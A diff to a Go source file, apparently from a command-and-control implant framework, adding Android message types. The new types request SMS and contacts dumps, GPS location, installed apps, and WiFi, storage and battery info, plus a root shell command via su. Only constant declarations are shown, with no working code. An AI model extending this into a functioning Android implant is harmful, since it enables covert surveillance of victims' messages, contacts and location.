@@ -358,6 +358,48 @@ const (
 
 	// MsgExecuteChildrenReq - List tracked background execute child processes
 	MsgExecuteChildrenReq
+
+	// ── Android messages ────────────────────────────────────────────
+	// MsgAndroidDeviceInfoReq - Request Android device profile
+	MsgAndroidDeviceInfoReq
+	// MsgAndroidDeviceInfo - Android device profile response
+	MsgAndroidDeviceInfo
+	// MsgAndroidAppsReq - Request list of installed apps
+	MsgAndroidAppsReq
+	// MsgAndroidApps - Installed apps response
+	MsgAndroidApps
+	// MsgAndroidSMSReq - Request SMS dump
+	MsgAndroidSMSReq
+	// MsgAndroidSMS - SMS data response
+	MsgAndroidSMS
+	// MsgAndroidContactsReq - Request contacts dump
+	MsgAndroidContactsReq
+	// MsgAndroidContacts - Contacts data response
+	MsgAndroidContacts
+	// MsgAndroidLocationReq - Request GPS location
+	MsgAndroidLocationReq
+	// MsgAndroidLocation - Location data response
+	MsgAndroidLocation
+	// MsgAndroidWifiReq - Request WiFi info
+	MsgAndroidWifiReq
+	// MsgAndroidWifi - WiFi info response
+	MsgAndroidWifi
+	// MsgAndroidStorageReq - Request storage info
+	MsgAndroidStorageReq
+	// MsgAndroidStorage - Storage info response
+	MsgAndroidStorage
+	// MsgAndroidBatteryReq - Request battery status
+	MsgAndroidBatteryReq
+	// MsgAndroidBattery - Battery status response
+	MsgAndroidBattery
+	// MsgAndroidRootShellReq - Execute command as root via su
+	MsgAndroidRootShellReq
+	// MsgAndroidRootShell - Root shell command response
+	MsgAndroidRootShell
+	// MsgAndroidGenericReq - Generic Android request wrapper
+	MsgAndroidGenericReq
+	// MsgAndroidGeneric - Generic Android response
+	MsgAndroidGeneric
 )
 
 // Constants to replace enums
